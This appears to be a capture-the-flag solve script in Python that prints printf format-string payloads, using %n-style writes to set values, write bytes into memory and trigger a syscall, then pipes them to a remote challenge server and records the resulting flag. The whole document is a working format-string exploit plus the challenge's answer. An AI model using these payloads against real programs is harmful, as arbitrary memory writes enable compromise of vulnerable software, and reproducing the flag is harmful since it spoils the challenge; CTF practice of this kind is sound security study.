print("%1$42s%6$hhn")  # x = 42
print("%1$4919s%8$hn")  # y = 0x1337

# write to ram byte by byte
for i, b in enumerate(b"gimmeflagpls"):
    print(f"%1${i}s%4$hhn")
    print(f"%1${b}s%3$hhn")

print("%1$0s%4$hhn")  # reset ram address
print("%1$69s%9$hhn")  # syscall

# python solve.py | nc spclr.ch 1390
# ictf{pr1ntf_1s_w31rd_but_p0w3rful}
